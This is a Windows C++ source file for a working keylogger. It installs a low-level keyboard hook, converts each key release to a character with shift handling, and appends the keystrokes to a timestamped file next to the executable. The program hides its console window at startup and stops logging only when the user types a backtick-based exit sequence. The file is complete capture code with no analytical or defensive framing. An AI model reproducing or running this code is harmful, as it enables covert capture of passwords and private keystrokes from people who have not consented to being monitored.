#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define UNICODE
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include "text_UTF-8.txt"


template <typename TYPE_ELEMENT>
struct RING_BUFFER {
	struct CONSTRUCTOR_STRUCTURE {
		size_t        initial_size;
		bool          reserve_0, use_builtin_storage, fill_0;
		HANDLE        h_heap;
		TYPE_ELEMENT* external_storage;
		CONSTRUCTOR_STRUCTURE(): initial_size(0), reserve_0(false), use_builtin_storage(true), fill_0(false), h_heap(nullptr), external_storage(nullptr) { }
	};
	size_t        buffer_size, pointer;
	TYPE_ELEMENT* buffer;
	HANDLE        h_heap;
	RING_BUFFER(CONSTRUCTOR_STRUCTURE* constructor): buffer_size(constructor->initial_size), pointer(0) {
		if (constructor->use_builtin_storage) {
			h_heap = (constructor->h_heap == nullptr) ? GetProcessHeap() : constructor->h_heap;
			buffer = (TYPE_ELEMENT*)HeapAlloc(h_heap, 0, (constructor->reserve_0 ? buffer_size + 1 : buffer_size) * sizeof(TYPE_ELEMENT));
		} else {
			h_heap = nullptr;
			buffer = constructor->external_storage;
		}
		if (buffer != nullptr && constructor->reserve_0) buffer[buffer_size] = (TYPE_ELEMENT)0;
		if (constructor->fill_0) ZeroMemory(buffer, buffer_size * sizeof(TYPE_ELEMENT));
	}
	~RING_BUFFER() {
		if (h_heap != nullptr && buffer != nullptr) {
			HeapFree(h_heap, 0, buffer);
			buffer = nullptr;
		}
	}
	void write(TYPE_ELEMENT new_element) {
		buffer[pointer++] = new_element;
		if (pointer >= buffer_size) pointer = 0;
	}
	void readback(TYPE_ELEMENT* dest, size_t count, bool end_0 = true) {
		size_t dest_counter = 0, temp_pointer = pointer;
		while (count > 0) {
			if (count <= temp_pointer) {
				size_t final_pointer = temp_pointer - count;
				while (temp_pointer > final_pointer) dest[dest_counter++] = buffer[--temp_pointer];
				break;
			}
			count -= temp_pointer;
			while (temp_pointer > 0) dest[dest_counter++] = buffer[--temp_pointer];
			temp_pointer = buffer_size;
		}
		if (end_0) dest[dest_counter] = (TYPE_ELEMENT)0;
	}
	bool checkback(const TYPE_ELEMENT* target, size_t length) {
		size_t temp_pointer = pointer;
		while (length > 0) {
			if (length <= temp_pointer) {
				while (length > 0) if (target[--length] != buffer[--temp_pointer]) return false;
				return true;
			}
			while (temp_pointer > 0) if (target[--length] != buffer[--temp_pointer]) return false;
			temp_pointer = buffer_size;
		}
		return true;
	}
};

struct INPUT_MONITOR {
	HHOOK                              h_hook;
	RING_BUFFER<DWORD>*                p_recent_keys;
	thread_local static INPUT_MONITOR* gp_current_instance;
	HANDLE                             h_file;
	size_t                             unwrote_chars;
	INPUT_MONITOR(): h_hook(nullptr), p_recent_keys(nullptr) { }
	~INPUT_MONITOR() { cleanup(); }
	bool init(HANDLE h_storage, size_t memory_size = 64, HINSTANCE h_instance = nullptr) {
		h_file = h_storage;
		if (h_hook == nullptr) {
			if (h_instance == nullptr) h_instance = GetModuleHandle(nullptr);
			h_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LL_keyboard_proc, h_instance, 0);
			if (h_hook == nullptr) {
				MessageBoxW(nullptr, L"Unable to set hook!", L"ERROR", MB_OK | MB_ICONERROR);
				return false;
			}
		}
		RING_BUFFER<DWORD>::CONSTRUCTOR_STRUCTURE buffer_constructor;
		buffer_constructor.initial_size = memory_size;
		buffer_constructor.reserve_0 = false;
		buffer_constructor.use_builtin_storage = true;
		buffer_constructor.fill_0 = true;
		p_recent_keys = new RING_BUFFER<DWORD>(&buffer_constructor);
		if (p_recent_keys == nullptr) {
			cleanup();
			MessageBoxW(nullptr, L"Out of memory!", L"ERROR", MB_OK | MB_ICONERROR);
			return false;
		}
		gp_current_instance = this;
		MessageBoxW(nullptr, L"Hook set!", L"YEAH", MB_OK);
		return true;
	}
	void cleanup() {
		if (h_hook != nullptr) {
			UnhookWindowsHookEx(h_hook);
			h_hook = nullptr;
			MessageBoxW(nullptr, L"Hook removed!", L"YEAH", MB_OK);
		}
		if (p_recent_keys != nullptr) {
			delete p_recent_keys;
			p_recent_keys = nullptr;
		}
	}
	static LRESULT CALLBACK LL_keyboard_proc(int code, WPARAM wparam, LPARAM lparam) {
	    if (code == HC_ACTION) {
	        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lparam;
	        if (!(p->flags & LLKHF_INJECTED) && (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)) {
            	gp_current_instance->unwrote_chars++;
            	gp_current_instance->p_recent_keys->write(p->vkCode);
        	}
	    }
	    return CallNextHookEx(NULL, code, wparam, lparam);
	}
}; thread_local INPUT_MONITOR* INPUT_MONITOR::gp_current_instance = nullptr;

void handle_thread_message(INPUT_MONITOR* p_monitor) {
	const DWORD exit_keys[] = { 0xC0, 0xC0, 0xC0, 0x45, 0x58, 0x49, 0x54 }; // "```EXIT"
	MSG   message;
	bool  newline = true;
	DWORD last_input = GetTickCount();
	while (true) {
		while (PeekMessage(&message, NULL, 0, 0, PM_REMOVE) > 0) {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        if (p_monitor->p_recent_keys->checkback(exit_keys, 7)) break;
        DWORD* unwrote_chars = (DWORD*)__builtin_alloca(p_monitor->unwrote_chars * sizeof(DWORD));
        p_monitor->p_recent_keys->readback(unwrote_chars, p_monitor->unwrote_chars, false);
        if (p_monitor->unwrote_chars > 0) {
        	last_input = GetTickCount();
        	newline = false;
			do {
				UINT current_char = MapVirtualKey(unwrote_chars[--p_monitor->unwrote_chars], MAPVK_VK_TO_CHAR);
	        	if (current_char > 0) {
					bool shift_up = (GetAsyncKeyState(VK_SHIFT) & 0x8000) == 0;
					if ((current_char & 0x80000000) == 0) {
					    char actual_char = char(current_char & 0xFF);
					    if (shift_up) {
					    	if ('A' <= actual_char && actual_char <= 'Z') actual_char += 32;
						} else {
							switch (actual_char) {
								case '`': actual_char = '~'; break; case '1': actual_char = '!'; break; case '2': actual_char = '@'; break;
								case '3': actual_char = '#'; break; case '4': actual_char = '$'; break; case '5': actual_char = '%'; break;
								case '6': actual_char = '^'; break; case '7': actual_char = '&'; break; case '8': actual_char = '*'; break;
								case '9': actual_char = '('; break; case '0': actual_char = ')'; break; case '-': actual_char = '_'; break;
								case '=': actual_char = '+'; break; case '[': actual_char = '{'; break; case ']': actual_char = '}'; break;
								case ';': actual_char = ':'; break; case ',': actual_char = '<'; break; case '.': actual_char = '>'; break;
								case  '/': actual_char =  '?'; break;
								case '\\': actual_char =  '|'; break;
								case '\'': actual_char = '\"'; break;
							}
						}
					    DWORD unused;
					    WriteFile(p_monitor->h_file, &actual_char, 1, &unused, nullptr);
					}
				}
			} while (p_monitor->unwrote_chars > 0);
		}
		if (GetTickCount() - last_input > 10000) {
			last_input = GetTickCount();
			if (!newline) {
				const char line_break = '\n';
				DWORD unused;
				WriteFile(p_monitor->h_file, &line_break, 1, &unused, nullptr);
				newline = true;
			}
		}
        Sleep(16);
	}
}

HANDLE create_file() {
	srand(GetTickCount() ^ GetCurrentProcessId());
	SYSTEMTIME time;
	GetSystemTime(&time);
	
	wchar_t path[MAX_PATH], file_name[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    size_t last_backslash = 0, i = 0;
	while (path[++i] != L'\0') if (path[i] == L'\\') last_backslash = i;
	path[last_backslash] = L'\0';
	
	swprintf_s(
		file_name, UTF8::filename_format, path,
    	time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond, time.wMilliseconds, time.wDayOfWeek, rand());
	printf("%ls\n", file_name);
	HANDLE h_file = CreateFileW(file_name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h_file == INVALID_HANDLE_VALUE) { wprintf(L"CreateFileW failed, err=%lu\n", GetLastError()); }
	return h_file;
}

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	srand(GetTickCount() ^ GetCurrentProcessId());
	HANDLE h_file = create_file();
	if (h_file == INVALID_HANDLE_VALUE) {
		MessageBoxW(nullptr, L"Failed to create file!", L"ERROR", MB_OK | MB_ICONERROR);
		return 1;
	}
	printf("%p\n", h_file);
	INPUT_MONITOR monitor;
	monitor.init(h_file);
    handle_thread_message(&monitor);
    CloseHandle(h_file);
    return 0;
}

